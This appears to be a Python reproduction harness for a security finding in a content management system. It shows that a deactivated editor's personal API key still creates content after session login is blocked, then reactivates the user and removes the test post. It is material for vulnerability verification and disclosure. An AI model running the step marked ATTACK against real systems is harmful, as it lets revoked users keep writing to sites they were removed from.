#!/usr/bin/env python3
"""CK-004 harness: deactivated user's personal (USR-) API key stays valid.
Prereqs: fixtures; editor1 has personal apiKey 'USR-editor-personal'.
Steps: verify key works -> admin deactivates editor1 (DB-verified) ->
session login is blocked (control) -> the USR key still CREATES content
(attack, write at the deactivated user's role scope) -> cleanup/reactivate.
"""
import sys, json, sqlite3
sys.path.insert(0, '../../live-repro')
from ck import *

KEY = 'USR-editor-personal'
sa, ca, au = login('admin', 'AdminPass123!')

def users_db():
    db = sqlite3.connect('../../src/storage/data/system.sqlite')
    return {json.loads(d[0])['user']: json.loads(d[0]) for d in db.execute('select document from users')}

def save_user(u, active):
    return admin_req(sa, ca, 'POST', '/system/users/save', json={
        'user': {'_id': u['_id'], 'user': u['user'], 'name': u['name'], 'email': u['email'],
                 'role': u['role'], 'active': active, 'apiKey': KEY},
        'password': 'AdminPass123!'})

r = api('GET', '/content/items/posts', key=KEY)
print(f'CONTROL key while active: HTTP {r.status_code} (expected 200)')
c1 = r.status_code == 200

ed = users_db()['editor1']
save_user(ed, False)
print('editor1 active in DB:', users_db()['editor1']['active'])
c2 = users_db()['editor1']['active'] is False

try:
    login('editor1', 'EditorPass123!')
    print('CONTROL session login while deactivated: STILL WORKS (unexpected)')
    c3 = False
except AssertionError:
    print('CONTROL session login while deactivated: blocked (expected)')
    c3 = True

r = api('POST', '/content/item/posts', key=KEY, json={'data': {'title': 'ghost write', 'secret': 'GHOST'}})
print(f'ATTACK deactivated user key CREATE: HTTP {r.status_code} {r.text[:130]}')
a = r.status_code == 200 and r.json().get('_cby') == ed['_id']
gid = r.json().get('_id') if r.status_code == 200 else None

save_user(users_db()['editor1'], True)
if gid:
    api('DELETE', f'/content/item/posts/{gid}', key='master-key-12345')
print('cleanup done (user reactivated, ghost item removed)')
print('VERDICT:', 'VULNERABLE - deactivated account API key remains valid' if (c1 and c2 and c3 and a) else 'NOT REPRODUCED')
sys.exit(0 if (c1 and c2 and c3 and a) else 1)
